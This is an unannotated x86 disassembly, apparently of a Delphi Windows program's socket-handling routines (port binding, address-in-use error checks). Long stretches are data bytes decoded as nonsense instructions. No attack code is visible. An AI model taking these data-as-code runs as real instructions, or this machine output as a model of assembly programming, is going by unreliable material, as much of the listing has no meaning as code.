add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x61506449 ] dl
arpl [ ebx + 0x61 ] bp
inc eax
add [ ebx + esi * 8 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 ] cl
outsb
je r-xdata
add [ 0x65696c43 ] cl
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xf3
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
test al 0xf2
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
inc ebx
push es
add [ eax ] al
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
pushfd
hlt
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
outsd
jne r-xdata
inc ebx
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
dec ecx
dec esi
outsd
je r-xdata
shl [ esp + esi * 8 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x426f6f54
imul esp [ edi - 0x73 ] 0xf3700040
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x43644945 ] dl
shl bl 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046f2 ] ch
add [ eax ] al
add [ edi + ebx * 4 + 0x46 ] ah
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ eax ] al
[ eax ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_46c270
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_46fb14
sub_46f454
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
hlt
sub_46f4b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_46c270
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_46fb14
sub_46f4ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x1
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_46f520
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_46facc
mov eax ebx
call sub_46faf0
sub_46f558
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_46f588
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_46f5ac
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_46f5d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c21c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46f610
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_46f6cf
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
push edx
push ecx
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x58 ]
cmp eax 0xffffffff
jne r-xdata
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
cmp eax 0x2738
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6d6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ rw-data ]
mov eax [ eax ]
or edx 0xffffffff
call sub_46c21c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub_46f6e0
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_46f70c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46f820
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_46fb44
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f827
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_46fb98
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
jmp r-xdata
sub_46f82c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_4041b8
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_46f848
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c21c
pop esi
pop ebx
retn
sub_46f870
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_46fb14
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46c228
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_46facc
mov eax edi
call sub_46faf0
sub_46f8e4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_41920c
mov dl 0x1
mov eax edi
call sub_46fb14
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46f93c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fa6d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_46e998
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46fa50
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418744
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46e954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_46f93c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_46f93c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa74
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_46fa80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4032b0
mov edi eax
mov eax esi
call sub_4032b0
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_4041b8
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_4041b8
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_418eb4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46facc
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_46faf0
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_46fb14
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_404164
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_404164
xor eax eax
mov [ ebx + 0x1c ] eax
sub_46fb44
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c228
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_46facc
sub_46fb98
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_46fb44
test al al
je r-xdata
sub_46fbc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx ecx
mov esi edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46fc3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418744
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_46e954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fc44
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_46fc70
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebp ebp
mov eax esi
call sub_419628
mov ebx eax
dec ebx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
mov edx ebx
mov eax esi
call sub_46fcec
cmp edi [ eax + 0xc ]
jne r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_46fcec
mov ebp eax
dec ebx
sub_46fcb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419918
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46fd00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fd25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fd2c
retn
sub_470038
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_47005c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421184
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_470098
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_41ad38
sub_4700c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_41ad38
sub_4700f8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_47016c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470191
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470198
retn
sub_470294
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eda4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_4702c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4702ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4702f4
retn
sub_470538
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41920c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x10 ] eax
mov eax esi
call sub_47051c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_470584
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_4705b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4706f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404164
cmp [ ebx + 0xc ] 0x0
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404164
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470700
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404188
retn
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ esi ]
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0xc ]
call sub_408350
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4044e4
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0xc ]
call sub_408350
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4044e4
push [ esi ]
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
call sub_408350
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x10 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4044e4
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax [ ebp - 0x4 ]
jle r-xdata
jmp r-xdata
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_47072c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_470827
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_47051c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47082e
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404188
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404684
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408250
mov eax [ ebp - 0xc ]
call sub_404424
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4708d4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4047b0
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404684
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_470838
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor eax eax
pop ebx
retn
sub_470858
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4708a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4708aa
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408350
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_4041b8
sub_4708d4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_4041b8
mov eax esi
call sub_404424
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_4084c8
mov [ ebx + 0xc ] eax
sub_47090c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
test eax eax
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_470900
mov esi eax
mov ecx ebp
mov edx edi
mov eax esi
call sub_4708b0
sub_470940
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419918
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
